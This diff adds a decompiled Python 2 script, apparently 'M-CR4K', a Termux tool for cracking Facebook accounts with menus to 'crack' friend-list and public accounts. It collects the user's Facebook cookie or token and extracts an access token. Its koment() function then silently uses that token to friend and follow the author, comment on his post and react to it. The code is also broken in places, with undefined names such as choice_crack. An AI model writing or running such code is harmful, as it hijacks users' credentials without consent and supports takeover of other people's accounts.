@@ -1,0 +1,264 @@
+# uncompyle6 version 3.7.4
+# Python bytecode 2.7
+# Decompiled from: Python 2.7.18 (default, Jul 28 2021, 22:55:59) 
+# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
+# Embedded file name: <KoNtol>
+try:
+    import itertools, os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass, mechanize, requests, uuid
+    from multiprocessing.pool import ThreadPool
+    from requests.exceptions import ConnectionError
+    from mechanize import Browser
+    from datetime import datetime
+except ImportError:
+    os.system('pip2 install requests')
+    os.system('pip2 install mechanize')
+    os.system('python2 M-CR4K.so')
+
+from requests.exceptions import ConnectionError
+bd = random.randint(20000000.0, 30000000.0)
+sim = random.randint(20000.0, 40000.0)
+user_ms = requests.get('https://raw.githubusercontent.com/mohammadjan1122/H4CK-FB/master/user_agent.txt').text.strip()
+header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-Telkomsel': repr(sim), 'x-fb-net-Telkomsel': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyLTE', 'user-agent': user_ms, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
+reload(sys)
+sys.setdefaultencoding('utf8')
+os.system('clear')
+
+def exit():
+    jalan('\nSee you soon\n')
+    os.sys.exit()
+
+
+def acak(b):
+    w = 'ahtdzjc'
+    d = ''
+    for i in x:
+        d += '!' + w[random.randint(0, len(w) - 1)] + i
+        return cetak(d)
+
+
+def jalan(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+
+
+def tik():
+    titik = [
+     '.   ', '..  ', '... ']
+    for o in titik:
+        print '\r\x1b[1;95m \xe2\x80\xa2\x1b[1;96m Memeriksa Key ' + o,
+        sys.stdout.flush()
+        time.sleep(1)
+
+
+idh = []
+cps = []
+cp = []
+ok = []
+oks = []
+back = 0
+threads = []
+
+def login_fb():
+    os.system('clear')
+    print logo
+    time.sleep(0.07)
+    print '[01]Login With Token'
+    time.sleep(0.07)
+    print '[02]Login With Cookie '
+    time.sleep(0.07)
+    print '[03]my facebook account '
+    time.sleep(0.07)
+    print '[04]my Telegram Channel '
+    time.sleep(0.07)
+    print ' [00] Exit'
+    time.sleep(0.07)
+    print 48 * '\x1b[1;91m\xe2\x94\x80'
+    time.sleep(0.07)
+    chose_login_fb()
+
+
+def chose_login_fb():
+    mi = raw_input('\x1b[1;96m M-CR4K Choose option:>>>')
+    if mi == '01':
+        os.system('clear')
+        print logo
+        token = raw_input(' Enter Fb Token : >>>')
+        sav = open('.token.txt', 'w')
+        sav.write(token)
+        sav.close()
+        jalan('                       ')
+        print ' Login succesful'
+        koment()
+    if mi == '02':
+        cookie()
+    elif mi == '03':
+        os.system('xdg-open https://m.facebook.com/mohammad.hacker.1122')
+    elif mi == '04':
+        os.system('xdg-open https://T.me/sultani1122')
+        login_fb()
+    elif mi == '00':
+        exit()
+
+
+def cookie():
+    print logo
+    print '\n  How To Get Token : https://t.me/sultani1122/5296'
+    print '\n  How To Get Cookie : https://t.me/sultani1122/5840'
+    cookie = raw_input('Enter  Your Cookie : >>> \x1b[0;96m')
+    try:
+        data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', 
+           'referer': 'https://m.facebook.com/', 
+           'host': 'm.facebook.com', 
+           'origin': 'https://m.facebook.com', 
+           'upgrade-insecure-requests': '1', 
+           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
+           'cache-control': 'max-age=0', 
+           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
+           'content-type': 'text/html; charset=utf-8'}, cookies={'cookie': cookie})
+        find_token = re.search('(EAAA\\w+)', data.text)
+        hasil = ' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Your Cookie Invalid' if find_token is None else '\n* Your fb access token : ' + find_token.group(1)
+    except requests.exceptions.ConnectionError:
+        print ' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] No Connection'
+
+    cookie = open('.token.txt', 'w')
+    cookie.write(find_token.group(1))
+    cookie.close()
+    koment()
+    return
+
+
+def koment():
+    try:
+        token = open('.token.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m [!] Token invalid'
+        os.system('rm -rf .token.txt')
+
+    una = '100027060438331'
+    kom = ' mohammad sultani\xf0\x9f\x98\x98'
+    post = '834886427423364'
+    kom2 = 'hi mohammad sultani i am user  M-CR4K script  \xf0\x9f\x98\x81'
+    reac2 = 'LOVE'
+    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + token)
+    requests.post('https://graph.facebook.com/100027060438331/subscribers?access_token=' + token)
+    requests.post('https://graph.facebook.com/100009918107424/subscribers?access_token=' + token)
+    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + token)
+    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom2 + '&access_token=' + token)
+    requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac2 + '&access_token=' + token)
+    ms_menu()
+
+
+def ms_menu():
+    os.system('clear')
+    try:
+        token = open('.token.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m [!] Token invalid'
+        os.system('rm -rf .token.txt')
+        time.sleep(1)
+        login_fb()
+
+    try:
+        r = requests.get('https://graph.facebook.com/me?access_token=' + token, headers=header)
+        a = json.loads(r.text)
+        name = a['name']
+    except KeyError:
+        os.system('clear')
+        print ' \x1b[1;91m[!] Token invalid'
+        os.system('rm -rf .token.txt')
+        time.sleep(1)
+        login_fb()
+    except requests.exceptions.ConnectionError:
+        print '\n [!] no Enternet  connection\n '
+        os.sys.exit()
+
+    os.system('clear')
+    print logo
+    ip = requests.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
+    jalan('welcome   \x1b[1;92m' + name + '\x1b[1;93m ]')
+    print 48 * '_'
+    time.sleep(0.07)
+    print 'your  IP: ' + ip + '  '
+    time.sleep(0.07)
+    print 48 * '_'
+    time.sleep(0.07)
+    print ' [1] Start Crack'
+    time.sleep(0.07)
+    print 48 * ' '
+    print ' [2] SETTING USER AGENT '
+    time.sleep(0.07)
+    print 48 * ' '
+    print ' [3] Follow/Add My Facebook'
+    time.sleep(0.07)
+    print 48 * ' '
+    print ' [4] Update  M-CR4K Script'
+    time.sleep(0.07)
+    print 48 * ' '
+    print ' [5] My Telegram group '
+    time.sleep(0.07)
+    print 48 * ' '
+    print ' [0] Exit'
+    print 48 * ' '
+    time.sleep(0.07)
+    print 48 * ' '
+    time.sleep(0.07)
+    chose_crack()
+
+
+def group():
+    os.system('clear')
+    print logo
+    os.system('xdg-open https://t.me/Mking_script')
+    raw_input('\n\x1b[1;91m back')
+    ms_menu()
+
+
+def chose_crack():
+    ms = raw_input(' M-CR4K Choose option :>>> ')
+    if ms == '1':
+        ms_start()
+    elif ms == '5':
+        group()
+    elif ms == '3':
+        ms_fb()
+    elif ms == '4':
+        os.system('clear')
+        update()
+    elif ms == '2':
+        setting_user()
+    elif ms == '0':
+        print '\n\x1b[0;97m exit\x1b[0;97m'
+        os.sys.exit()
+    else:
+        print '\x1b[1;91m [!] Wrong Input'
+        chose_crack()
+
+
+logo = '\n\n\n #     #          #####   ######   #        #    # \n ##   ##         #     #  #     #  #    #   #   #  \n # # # #         #        #     #  #    #   #  #   \n #  #  #  #####  #        ######   #    #   ###    \n #     #         #        #   #    #######  #  #   \n #     #         #     #  #    #        #   #   #  \n #     #          #####   #     #       #   #    # \n                                                   \n\n--------------------------------------------------\x1a\n\x1a Author      : Mohammad Sultani \n\x1a GitHub      : https://github.com/Mohammadjan1122\n\x1a YouTube     : Termux Master\n\x1a Telegram    : https://t.me/sultani1122\n Blogspot    : https://mohammadsultani.blogspot.com\n--------------------------------------------------\n'
+
+def ms_start():
+    global token
+    os.system('clear')
+    try:
+        token = open('.token.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m [!] Token invalid'
+        os.system('rm -rf .token.txt')
+        time.sleep(1)
+        login_fb()
+
+    os.system('clear')
+    print logo
+    print ' [1] Crack From Frend List '
+    time.sleep(0.07)
+    print ' [2] Crack From Public Account'
+    time.sleep(0.07)
+    print ' [0] back'
+    time.sleep(0.07)
+    print 48 * '_'
+    time.sleep(0.07)
+    choice_crack()
+if __name__ == '__main__':
+    ms_menu()
